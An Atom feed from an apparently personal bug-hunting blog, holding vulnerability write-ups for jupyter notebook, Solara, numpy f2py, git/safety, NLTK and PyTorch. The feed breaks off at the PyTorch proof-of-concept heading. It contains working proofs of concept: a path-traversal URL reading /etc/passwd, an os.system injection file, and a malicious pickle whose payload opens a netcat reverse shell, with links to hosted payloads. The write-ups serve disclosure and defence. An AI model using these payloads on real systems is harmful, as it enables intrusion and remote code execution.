<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="http://0.0.0.0:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://0.0.0.0:4000/" rel="alternate" type="text/html" /><updated>2024-07-15T15:37:37+08:00</updated><id>http://0.0.0.0:4000/feed.xml</id><title type="html">sunriseXu’s bug hunting journey</title><subtitle>sunriseXu&apos;s bug hunting journey, sharing new findings of bug hunting.</subtitle><entry><title type="html">Arbitrary File Overwrite in jupyter notebook</title><link href="http://0.0.0.0:4000/file-overwrite/2024/07/09/arbitrary-file-overwrite-in-jupyter-notebook.html" rel="alternate" type="text/html" title="Arbitrary File Overwrite in jupyter notebook" /><published>2024-07-09T10:31:06+08:00</published><updated>2024-07-09T10:31:06+08:00</updated><id>http://0.0.0.0:4000/file-overwrite/2024/07/09/arbitrary-file-overwrite-in-jupyter-notebook</id><content type="html" xml:base="http://0.0.0.0:4000/file-overwrite/2024/07/09/arbitrary-file-overwrite-in-jupyter-notebook.html"><![CDATA[<h2 id="name">Name</h2>

<blockquote>
  <p>Arbitrary File Overwrite in jupyter notebook</p>
</blockquote>

<h2 id="weakness">Weakness</h2>

<blockquote>
  <p>CWE-22: Path Traversal</p>
</blockquote>

<h2 id="severity">Severity</h2>

<blockquote>
  <p>High (8.8)</p>
</blockquote>

<h2 id="version">Version</h2>

<blockquote>
  <p>6.5.7</p>
</blockquote>

<h3 id="summary">Summary</h3>

<p>Notebook can install a Javascript extension <a href="https://github.com/jupyter/notebook/blob/633c5be992a7139f67df8615e7c3ea0fc5e787c9/notebook/nbextensions.py#L69">from remote sources</a>, if the remote source package is compressed using tar format, it will use <a href="https://github.com/jupyter/notebook/blob/633c5be992a7139f67df8615e7c3ea0fc5e787c9/notebook/nbextensions.py#L154"><code class="language-plaintext highlighter-rouge">tarfile.extractall</code></a> to extract tarball.  However, it doesn’t filter the members in tarball, in this case, members with absolute and relative path names will be extract outside target directory, causing arbitrary file overwrite.</p>

<h3 id="details">Details</h3>

<p>From the <a href="https://github.com/jupyter/notebook/blob/633c5be992a7139f67df8615e7c3ea0fc5e787c9/notebook/nbextensions.py#L635">source code</a>, user can install nbextension by following command:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jupyter nbextension install path|url [--user|--sys-prefix]
</code></pre></div></div>
<p>When installing packages from an url, it calls <code class="language-plaintext highlighter-rouge">install_nbextension</code> to download the tarball from online source and extracts the tarball using <code class="language-plaintext highlighter-rouge">tarfile.extractall</code>.
The vulnerable function <a href="https://github.com/jupyter/notebook/blob/633c5be992a7139f67df8615e7c3ea0fc5e787c9/notebook/nbextensions.py#L154"><code class="language-plaintext highlighter-rouge">install_nbextension#L154</code></a>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def install_nbextension(path, overwrite=False, symlink=False,
                        user=False, prefix=None, nbextensions_dir=None,
                        destination=None, verbose=DEPRECATED_ARGUMENT,
                        logger=None, sys_prefix=False
                        ):
    ...
    if path.startswith(('https://', 'http://')):
        if symlink:
            raise ValueError("Cannot symlink from URLs")
        # Given a URL, download it
        with TemporaryDirectory() as td:
            filename = urlparse(path).path.split('/')[-1]
            local_path = os.path.join(td, filename)
            if logger:
                logger.info(f"Downloading: {path} -&gt; {local_path}")
            urlretrieve(path, local_path)
            # now install from the local copy
            full_dest = install_nbextension(local_path, overwrite=overwrite, symlink=symlink,
                nbextensions_dir=nbext, destination=destination, logger=logger)
    elif path.endswith('.zip') or _safe_is_tarfile(path):
        if symlink:
            raise ValueError("Cannot symlink from archives")
        if destination:
            raise ValueError("Cannot give destination for archives")
        if logger:
            logger.info(f"Extracting: {path} -&gt; {nbext}")

        if path.endswith('.zip'):
            archive = zipfile.ZipFile(path)
        elif _safe_is_tarfile(path):
            archive = tarfile.open(path)
        # Vulnerable sink!!!!
        archive.extractall(nbext)
        archive.close()
        ...

    return full_dest
</code></pre></div></div>

<h3 id="poc">PoC</h3>

<ol>
  <li>
    <p>Using following command to install a malicious extension:</p>

    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  jupyter nbextension install https://media.githubusercontent.com/media/sunriseXu/onnx/main/hack.tar.gz --user
</code></pre></div>    </div>
  </li>
  <li>Check file path <code class="language-plaintext highlighter-rouge">/home/kali/.ssh/authorized_keys</code> has been overwritten
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  ls -la /home/kali/.ssh
  &gt; -rw-r--r--  1 kali kali 2098 Sep 11  2023 authorized_keys
</code></pre></div>    </div>
  </li>
  <li>Check on <a href="https://colab.research.google.com/drive/1iX1yj4CaRn4fQBoiejQM059Xp9z8gOmm?usp=sharing">colab</a>.</li>
</ol>

<p><img width="751" alt="1720496729240" src="https://github.com/jupyter/notebook/assets/33363160/90fc632b-dd9c-43c2-9a41-61ded73ac4a8" /></p>

<h3 id="impact">Impact</h3>

<p>If a victim installs a malicious tarball extension, the tarball will be extracted outside the target directory and cause arbitrary file overwrite.</p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Local File Inclusion in Solara</title><link href="http://0.0.0.0:4000/file-overwrite/2024/07/09/local-file-inclusion-in-solara.html" rel="alternate" type="text/html" title="Local File Inclusion in Solara" /><published>2024-07-09T10:31:06+08:00</published><updated>2024-07-09T10:31:06+08:00</updated><id>http://0.0.0.0:4000/file-overwrite/2024/07/09/local-file-inclusion-in-solara</id><content type="html" xml:base="http://0.0.0.0:4000/file-overwrite/2024/07/09/local-file-inclusion-in-solara.html"><![CDATA[<h2 id="name">Name</h2>

<blockquote>
  <p>Local File Inclusion in Solara</p>
</blockquote>

<h2 id="weakness">Weakness</h2>

<blockquote>
  <p>CWE-22: Path Traversal</p>
</blockquote>

<h2 id="severity">Severity</h2>

<blockquote>
  <p>High (8.8)</p>
</blockquote>

<h2 id="version">Version</h2>

<blockquote>
  <p>1.34.1</p>
</blockquote>

<h3 id="summary">Summary</h3>

<p>A local file inclusion is present in the Solara when requesting resource files under the <code class="language-plaintext highlighter-rouge">/{cdn_helper.cdn_url_path}/&lt;path:path&gt;</code> route.</p>

<h3 id="details">Details</h3>

<p>The endpoint <a href="https://github.com/widgetti/solara/blob/b69c5e06068038291025badce652824a7962bc8b/solara/server/flask.py#L215">cdn</a> is used to load resource file from cdn. However when resource file is cached, it will load files from local file system directly.</p>

<p>The <a href="https://github.com/widgetti/solara/blob/b69c5e06068038291025badce652824a7962bc8b/solara/server/flask.py#L215"><code class="language-plaintext highlighter-rouge">cdn</code> endpoint</a>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>@blueprint.route(f"/{cdn_helper.cdn_url_path}/&lt;path:path&gt;")
def cdn(path):
    if not allowed():
        abort(401)
    cache_directory = settings.assets.proxy_cache_dir
    content = cdn_helper.get_data(Path(cache_directory), path)
    mime = mimetypes.guess_type(path)
    return flask.Response(content, mimetype=mime[0])
</code></pre></div></div>

<p>The <a href="https://github.com/widgetti/solara/blob/b69c5e06068038291025badce652824a7962bc8b/solara/server/cdn_helper.py#L38"><code class="language-plaintext highlighter-rouge">get_data</code></a> calls <a href="https://github.com/widgetti/solara/blob/b69c5e06068038291025badce652824a7962bc8b/solara/server/cdn_helper.py#L24"><code class="language-plaintext highlighter-rouge">get_from_cache</code></a> to lookup cached files, it  concatenates <code class="language-plaintext highlighter-rouge">path</code> into <code class="language-plaintext highlighter-rouge">base_cache_dir</code> to get cached path directly and load the content afterwards. The <code class="language-plaintext highlighter-rouge">path</code> comes from the <code class="language-plaintext highlighter-rouge">&lt;path:path&gt;</code> part of <code class="language-plaintext highlighter-rouge">cdn</code> route. In this case, when path is <code class="language-plaintext highlighter-rouge">..%2f..%2f..%2f..%2f..%2fetc%2fpasswd</code>, attacks can use path traversal to read any files in local file system.</p>

<p>The function <a href="https://github.com/widgetti/solara/blob/b69c5e06068038291025badce652824a7962bc8b/solara/server/cdn_helper.py#L38"><code class="language-plaintext highlighter-rouge">get_data</code></a> and <a href="https://github.com/widgetti/solara/blob/b69c5e06068038291025badce652824a7962bc8b/solara/server/cdn_helper.py#L24"><code class="language-plaintext highlighter-rouge">get_from_cache</code></a></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def get_data(base_cache_dir: pathlib.Path, path):
    parts = path.replace("\\", "/").split("/")
    store_path = path if len(parts) != 1 else pathlib.Path(path) / "__main.js"

    content = get_from_cache(base_cache_dir, store_path)
    if content:
        return content

    url = get_cdn_url(path)
    response = requests.get(url)
    if response.ok:
        put_in_cache(base_cache_dir, store_path, response.content)
        return response.content
    else:
        logger.warning("Could not load URL: %r", url)
        raise Exception(f"Could not load URL: {url}")

def get_from_cache(base_cache_dir: pathlib.Path, path):
    cache_path = base_cache_dir / path
    try:
        logger.info("Opening cache file: %s", cache_path)
        return cache_path.read_bytes()
    except FileNotFoundError:
        pass
</code></pre></div></div>

<h3 id="poc">PoC</h3>

<ol>
  <li>
    <p>Install Solara:</p>

    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> pip install solara
</code></pre></div>    </div>
  </li>
  <li>Create <code class="language-plaintext highlighter-rouge">sol.py</code> following <a href="https://github.com/widgetti/solara/tree/master?tab=readme-ov-file#first-script">official docs</a>:
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  import solara

 # Declare reactive variables at the top level. Components using these variables
 # will be re-executed when their values change.
 sentence = solara.reactive("Solara makes our team more productive.")
 word_limit = solara.reactive(10)


 @solara.component
 def Page():
     # Calculate word_count within the component to ensure re-execution when reactive variables change.
     word_count = len(sentence.value.split())

     solara.SliderInt("Word limit", value=word_limit, min=2, max=20)
     solara.InputText(label="Your sentence", value=sentence, continuous_update=True)

     # Display messages based on the current word count and word limit.
     if word_count &gt;= int(word_limit.value):
         solara.Error(f"With {word_count} words, you passed the word limit of {word_limit.value}.")
     elif word_count &gt;= int(0.8 * word_limit.value):
         solara.Warning(f"With {word_count} words, you are close to the word limit of {word_limit.value}.")
     else:
         solara.Success("Great short writing!")


 # The following line is required only when running the code in a Jupyter notebook:
 Page()
</code></pre></div>    </div>
  </li>
  <li>
    <p>Start the solara server.</p>

    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> solara run sol.py
 &gt; Solara server is starting at http://localhost:8765
</code></pre></div>    </div>
  </li>
  <li>
    <p>Open the url: <code class="language-plaintext highlighter-rouge">http://127.0.0.1:8765/_solara/cdn/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd</code>, the output is the contents of the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file:</p>

    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
 sys:x:3:3:sys:/dev:/usr/sbin/nologin
 sync:x:4:65534:sync:/bin:/bin/sync
 games:x:5:60:games:/usr/games:/usr/sbin/nologin
 man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
 lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
 mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
 news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
 uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
 proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
 ...
</code></pre></div>    </div>

    <p><img src="/assets/cve/solara.png" alt="poc" /></p>
  </li>
</ol>

<h3 id="impact">Impact</h3>

<p>Any file on the backend filesystem can be read by an attacker with access to the solara server directly(If reverse proxy server such as nginx is used, the path parameter will be blocked).</p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Unsafe eval via f2py in Numpy(Invalid)</title><link href="http://0.0.0.0:4000/file-overwrite/2024/07/03/eval-in-numpy.html" rel="alternate" type="text/html" title="Unsafe eval via f2py in Numpy(Invalid)" /><published>2024-07-03T10:31:06+08:00</published><updated>2024-07-03T10:31:06+08:00</updated><id>http://0.0.0.0:4000/file-overwrite/2024/07/03/eval-in-numpy</id><content type="html" xml:base="http://0.0.0.0:4000/file-overwrite/2024/07/03/eval-in-numpy.html"><![CDATA[<h2 id="name">Name</h2>

<blockquote>
  <p>Unsafe eval via f2py in Numpy</p>
</blockquote>

<h2 id="weakness">Weakness</h2>

<blockquote>
  <p>CWE-94: Code Injection</p>
</blockquote>

<h2 id="severity">Severity</h2>

<blockquote>
  <p>High (8.8)</p>
</blockquote>

<h2 id="version">Version</h2>

<blockquote>
  <p>2.0.0</p>
</blockquote>

<h2 id="description">Description</h2>

<p><a href="https://numpy.org/doc/stable/f2py/index.html#f2py-user-guide-and-reference-manual">F2PY</a> distributed as part of NumPy which is used to convert fortan module to python module. It will convert fortan module to C <code class="language-plaintext highlighter-rouge">.so</code> module for python to import. During conversion, F2PY needs to know what would be the corresponding C type and a general solution for that would be too complicated to implement. A json file containing fortan type to C type mapping can be passed to F2PY by using the <a href="https://numpy.org/doc/stable/f2py/advanced/use_cases.html#dealing-with-kind-specifiers">–f2cmap option</a> during conversion:</p>

<p>The mapping file format:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;Fortran typespec&gt; : {&lt;selector_expr&gt;:&lt;C type&gt;}
</code></pre></div></div>

<p>A mapping file example:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{'real': {'KIND(0.0D0)': 'double'}}
</code></pre></div></div>

<p>However, during loading of f2cmap file, <a href="https://github.com/numpy/numpy/blob/c21ac104e544e24c88dbf625b6dccdbe7b90e39e/numpy/f2py/capi_maps.py#L138C5-L138C21">load_f2cmap_file</a> is called and <code class="language-plaintext highlighter-rouge">eval()</code> is used to parse the json content in the mapping file. If a victim loads a malicious mapping file, command injection can be achieved.</p>

<p>The vulnerable sink: <a href="https://github.com/numpy/numpy/blob/c21ac104e544e24c88dbf625b6dccdbe7b90e39e/numpy/f2py/capi_maps.py#L157">load_f2cmap_file#L157</a>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def load_f2cmap_file(f2cmap_file):
    global f2cmap_all, f2cmap_mapped

    f2cmap_all = copy.deepcopy(f2cmap_default)

    if f2cmap_file is None:
        # Default value
        f2cmap_file = '.f2py_f2cmap'
        if not os.path.isfile(f2cmap_file):
            return

    try:
        outmess('Reading f2cmap from {!r} ...\n'.format(f2cmap_file))
        with open(f2cmap_file) as f:
            # vulnerable to command injection
            d = eval(f.read().lower(), {}, {})
        f2cmap_all, f2cmap_mapped = process_f2cmap_dict(f2cmap_all, d, c2py_map, True)
        outmess('Successfully applied user defined f2cmap changes\n')
    except Exception as msg:
        errmess('Failed to apply user defined f2cmap changes: %s. Skipping.\n' % (msg))
</code></pre></div></div>

<h2 id="proof-of-concept">Proof of Concept</h2>

<p>Firstly, let’s create a malicous mapping file named <code class="language-plaintext highlighter-rouge">mapfile.txt</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>__import__('os').system('id')
</code></pre></div></div>

<p>Then, install numpy:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pip install --upgrade numpy
</code></pre></div></div>

<h3 id="start-attack">Start attack</h3>

<p>Load <code class="language-plaintext highlighter-rouge">mapfile.txt</code> using <code class="language-plaintext highlighter-rouge">F2PY</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>f2py -c test.f --f2cmap mapfile.txt
</code></pre></div></div>

<p>Now let’s check the output, the command <code class="language-plaintext highlighter-rouge">id</code> is executed successfully:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>running build
running config_cc
INFO: unifing config_cc, config, build_clib, build_ext, build commands --compiler options
running config_fc
INFO: unifing config_fc, config, build_clib, build_ext, build commands --fcompiler options
running build_src
INFO: build_src
INFO: building extension "untitled" sources
INFO: f2py options: ['--f2cmap', 'mapfile.txt']
INFO: f2py:&gt; /tmp/tmpgkxylea2/src.linux-x86_64-3.10/untitledmodule.c
creating /tmp/tmpgkxylea2/src.linux-x86_64-3.10
OSError: [Errno 2] No such file or directory: 'test.f'. Skipping file "test.f".
Reading f2cmap from 'mapfile.txt' ...
uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),116(netdev),1001(docker)
</code></pre></div></div>

<h2 id="colab">Colab</h2>

<p>Tested on google colab: <a href="https://colab.research.google.com/drive/1Cx6nYcAK0251NgGWi4JsTeCalg5VDMat?usp=sharing">https://colab.research.google.com/drive/1Cx6nYcAK0251NgGWi4JsTeCalg5VDMat?usp=sharing</a></p>

<p><img src="https://live.staticflickr.com/65535/53834219079_360ff6894d_h.jpg" alt="poc" /></p>

<h2 id="impact">Impact</h2>

<p>This vulnerability can have severe consequences. If victims load an malicious mapping file, command injection can be achieved.</p>

<h2 id="occurrences">Occurrences</h2>

<p><a href="https://github.com/numpy/numpy/blob/c21ac104e544e24c88dbf625b6dccdbe7b90e39e/numpy/f2py/capi_maps.py#L157">load_f2cmap_file#L157</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Git remote origin leaks user access token(Invalid)</title><link href="http://0.0.0.0:4000/file-overwrite/2024/07/01/git-origin-leak-access-token.html" rel="alternate" type="text/html" title="Git remote origin leaks user access token(Invalid)" /><published>2024-07-01T10:31:06+08:00</published><updated>2024-07-01T10:31:06+08:00</updated><id>http://0.0.0.0:4000/file-overwrite/2024/07/01/git-origin-leak-access-token</id><content type="html" xml:base="http://0.0.0.0:4000/file-overwrite/2024/07/01/git-origin-leak-access-token.html"><![CDATA[<h2 id="name">Name</h2>

<blockquote>
  <p>Git remote origin leaks user access token</p>
</blockquote>

<h2 id="version">Version</h2>

<blockquote>
  <p>2.45.2</p>
</blockquote>

<h2 id="description">Description</h2>

<p>Lots of people are using personal access token to clone their private repository. To use a access token, you can include your username and token in https url to clone projects on github, gitlab or any other DevOps Platform:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://&lt;username&gt;:&lt;token&gt;@github.com/username/repository.git
</code></pre></div></div>

<p>However, we can get the token back easily by just using <code class="language-plaintext highlighter-rouge">git remote get-url origin</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd privateProject
git remote get-url origin
&gt; https://username:ghp_xxxxx@github.com/username/repository.git
</code></pre></div></div>

<p>This can be dangerous, because we often run third party tools in our private repository. If a malicious tool runs <code class="language-plaintext highlighter-rouge">git remote get-url origin</code>, it can steal our personal access token of github or gitlab. In this case, our github/gitlab will be controlled by attackers which can have severe consequences.</p>

<p>I found this issue during code auditing via <a href="https://github.com/pyupio/safety">safety tool</a>. After scanning a project using <code class="language-plaintext highlighter-rouge">safety check -r requirements.txt --save-json test.json</code>, safety saved results into <code class="language-plaintext highlighter-rouge">test.json</code> file. However, when I looked into <code class="language-plaintext highlighter-rouge">test.json</code>, I found my personal access token in this file.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>"report_meta": {
    "scan_target": "files",
    "scanned": [
        "/home/kali/huntr/azure-sdk-for-python/tools/azure-sdk-tools/ci_tools/versioning/requirements.txt"
    ],
    "target_languages": [
        "python"
    ],
    "git": {
        "branch": "main",
        "tag": "",
        "commit": "b182b0c4f9d07d18f118130bc941c3b7a75667b1",
        "dirty": false,
        "origin": "https://outh2:ghp_xxxx@github.com/sunriseXu/xxxx.git"
    },
}
</code></pre></div></div>

<p>So, I looked into the source code of safety. The class <a href="https://github.com/pyupio/safety/blob/f15d7908d27fd887dcc6b31237b8e3df79a9359b/safety/scan/util.py#L49"><code class="language-plaintext highlighter-rouge">GIT</code></a> is responsible for collecting repository information in current repo where safety runs.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>class GIT:
    ORIGIN_CMD: Tuple[str, ...] = ("remote", "get-url", "origin")
    def __run__(self, cmd: Tuple[str, ...], env_var: Optional[str] = None) -&gt; Optional[str]:
        if env_var and os.environ.get(env_var):
            return os.environ.get(env_var)

        try:
            return subprocess.run(self.git + cmd, stdout=subprocess.PIPE, 
                                    stderr=subprocess.DEVNULL).stdout.decode('utf-8').strip()
        except Exception as e:
            LOG.exception(e)
        
        return None
    def origin(self) -&gt; Optional[str]:
        # get the origin of repository
        return self.__run__(self.ORIGIN_CMD, env_var="SAFETY_GIT_ORIGIN")
</code></pre></div></div>

<h2 id="impact">Impact</h2>

<p>This can have severe consequences. <strong>Any</strong> tools running in private repositories have ability to steal personal access token if the token is written in git remote url explicitly. Git should mask user’s access token when using cli command <code class="language-plaintext highlighter-rouge">git remote get-url origin</code>.</p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Command injection via unsafe pickle.loads in nltk.data.load in NLTK(Informative)</title><link href="http://0.0.0.0:4000/command-injection/2024/06/28/command-injection-in-nltk.html" rel="alternate" type="text/html" title="Command injection via unsafe pickle.loads in nltk.data.load in NLTK(Informative)" /><published>2024-06-28T10:31:06+08:00</published><updated>2024-06-28T10:31:06+08:00</updated><id>http://0.0.0.0:4000/command-injection/2024/06/28/command-injection-in-nltk</id><content type="html" xml:base="http://0.0.0.0:4000/command-injection/2024/06/28/command-injection-in-nltk.html"><![CDATA[<h2 id="name">Name</h2>

<blockquote>
  <p>Command injection via unsafe pickle.loads in nltk.data.load</p>
</blockquote>

<h2 id="weakness">Weakness</h2>

<blockquote>
  <p>CWE-94: Code Injection</p>
</blockquote>

<h2 id="severity">Severity</h2>

<blockquote>
  <p>High (8.8)</p>
</blockquote>

<h2 id="version">Version</h2>

<blockquote>
  <p>3.8.1</p>
</blockquote>

<h2 id="description">Description</h2>

<p>The NLTK api <a href="https://www.nltk.org/api/nltk.data.html?highlight=load#nltk.data.load"><code class="language-plaintext highlighter-rouge">nltk.data.load</code></a> is used to load a given resource from the NLTK data package, and it supports load pickle packages from remote sources. However, after the pickle file is downloaded, it uses <code class="language-plaintext highlighter-rouge">pickle.load</code> method to load the file which causing a malicious pickle file executing arbitrary code on victim’s mechine.</p>

<p>The vulnerable function: <a href="https://github.com/nltk/nltk/blob/8c233dc585b91c7a0c58f96a9d99244a379740d5/nltk/data.py#L754"><code class="language-plaintext highlighter-rouge">nltk.data.load</code></a></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def load(
    resource_url,
    format="auto",
    cache=True,
    verbose=False,
    logic_parser=None,
    fstruct_reader=None,
    encoding=None,
):
    
    resource_url = normalize_resource_url(resource_url)
    resource_url = add_py3_data(resource_url)

    ...
    # Load the resource.
    opened_resource = _open(resource_url)

    if format == "raw":
        resource_val = opened_resource.read()
    elif format == "pickle":
        # vulnerable to code execution attacks !!!!!
        resource_val = pickle.load(opened_resource)
    elif format == "json":
    ...
</code></pre></div></div>

<h2 id="proof-of-concept">Proof of Concept</h2>

<p>Firstly, create a malicious pickle file and upload to github.</p>

<h3 id="payloadpickle"><code class="language-plaintext highlighter-rouge">payload.pickle</code></h3>

<p>Use following snippets to create a malicous pickle payload:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import pickle
import os

class RCE:
    def __reduce__(self):
        cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | '
               '/bin/sh -i 2&gt;&amp;1 | nc 127.0.0.1 1234 &gt; /tmp/f')
        return os.system, (cmd,)

with open('payload.py.debug_pkl', 'wb') as f:
    pickle.dump(RCE(), f)
</code></pre></div></div>

<p>I have uploaded the <a href="https://raw.githubusercontent.com/sunriseXu/onnx/main/payload.pickle"><code class="language-plaintext highlighter-rouge">payload.pickle</code></a> to github for testing.</p>

<h2 id="start-attack">Start attack</h2>

<p>Install latest NLTK:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pip install nltk
</code></pre></div></div>

<p>Use following snippets to trigger the unsafe <code class="language-plaintext highlighter-rouge">pickle.loads</code> command injection:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>from nltk.data import load
load("https://raw.githubusercontent.com/sunriseXu/onnx/main/payload.pickle")
</code></pre></div></div>

<p>After the command executed, we can check the <code class="language-plaintext highlighter-rouge">/tmp/f</code> file is created.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; ls -la /tmp/f
prw-r--r-- 1 kali kali 0 Jun 24 19:48 /tmp/f
</code></pre></div></div>
<h2 id="colab">Colab</h2>

<p>Tested on google colab: <a href="https://colab.research.google.com/drive/160HoB0-PdFqOzBoUch7hj3n9olm2sfS1?usp=sharing">https://colab.research.google.com/drive/160HoB0-PdFqOzBoUch7hj3n9olm2sfS1?usp=sharing</a></p>

<p><img src="http://live.staticflickr.com/65535/53820920049_03d7b6ff6e_h.jpg" alt="image" /></p>

<h2 id="impact">Impact</h2>

<p>This vulnerability can have severe consequences. If victims load a malicious pickle file from remote sources using <code class="language-plaintext highlighter-rouge">nltk.data.load</code>, command injection can be achieved.</p>

<h2 id="occurrences">Occurrences</h2>

<p><a href="https://github.com/nltk/nltk/blob/8c233dc585b91c7a0c58f96a9d99244a379740d5/nltk/data.py#L754">nltk.data.load#L754</a></p>]]></content><author><name></name></author><category term="command-injection" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Command injection via unsafe pickle.loads in torch.utils.model_dump in pytorch(Informative)</title><link href="http://0.0.0.0:4000/command-injection/2024/06/24/command-injection-in-pytorch.html" rel="alternate" type="text/html" title="Command injection via unsafe pickle.loads in torch.utils.model_dump in pytorch(Informative)" /><published>2024-06-24T10:31:06+08:00</published><updated>2024-06-24T10:31:06+08:00</updated><id>http://0.0.0.0:4000/command-injection/2024/06/24/command-injection-in-pytorch</id><content type="html" xml:base="http://0.0.0.0:4000/command-injection/2024/06/24/command-injection-in-pytorch.html"><![CDATA[<h2 id="name">Name</h2>

<blockquote>
  <p>Command injection via unsafe pickle.loads in torch.utils.model_dump</p>
</blockquote>

<h2 id="weakness">Weakness</h2>

<blockquote>
  <p>CWE-94: Code Injection</p>
</blockquote>

<h2 id="severity">Severity</h2>

<blockquote>
  <p>High (8.8)</p>
</blockquote>

<h2 id="version">Version</h2>

<blockquote>
  <p>2.3.1</p>
</blockquote>

<h2 id="description">Description</h2>

<p>In pytorch module <a href="https://github.com/pytorch/pytorch/blob/main/torch/utils/model_dump/__init__.py"><code class="language-plaintext highlighter-rouge">torch.utils.model_dump</code></a>, the method <a href="https://github.com/pytorch/pytorch/blob/d21f311af880c736b18b5a588583f6162e9abcfa/torch/utils/model_dump/__init__.py#L189"><code class="language-plaintext highlighter-rouge">get_model_info</code></a> is responsible for extracting a model data in zip file. However, during the extraction, if a pickle file endswith <code class="language-plaintext highlighter-rouge">debug_pkl</code>, this file will be parsed by <a href="https://github.com/pytorch/pytorch/blob/d21f311af880c736b18b5a588583f6162e9abcfa/torch/utils/model_dump/__init__.py#L264"><code class="language-plaintext highlighter-rouge">pickle.loads</code> function</a>. In this case, if a <a href="https://book.hacktricks.xyz/pentesting-web/deserialization#pickle">malicous pickle file is parsed</a>, we can achive command injection in victim’s mechine.</p>

<p>The vulnerable function: <a href="https://github.com/pytorch/pytorch/blob/d21f311af880c736b18b5a588583f6162e9abcfa/torch/utils/model_dump/__init__.py#L264"><code class="language-plaintext highlighter-rouge">get_model_info</code></a></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def get_model_info(
        path_or_file,
        title=None,
        extra_file_size_limit=DEFAULT_EXTRA_FILE_SIZE_LIMIT):
    """Get JSON-friendly information about a model.

    The result is suitable for being saved as model_info.json,
    or passed to burn_in_info.
    """
    ...
    with zipfile.ZipFile(path_or_file) as zf:
        
        code_files = {}
        for zi in zf.infolist():
            if not zi.filename.endswith(".py"):
                continue
            with zf.open(zi) as handle:
                raw_code = handle.read()
            with zf.open(zi.filename + ".debug_pkl") as handle:
                raw_debug = handle.read()

            # Parse debug info and add begin/end markers if not present
            # to ensure that we cover the entire source code.
            # vulnerable sink!!!!!!!!!!
            debug_info_t = pickle.loads(raw_debug)
            
    ...
    return {"model": dict(
        title=title,
        file_size=file_size,
        version=version,
        zip_files=zip_files,
        interned_strings=list(interned_strings),
        code_files=code_files,
        model_data=model_data,
        constants=constants,
        extra_files_jsons=extra_files_jsons,
        extra_pickles=extra_pickles,
    )}
</code></pre></div></div>

<h2 id="proof-of-concept">Proof of Concept</h2>

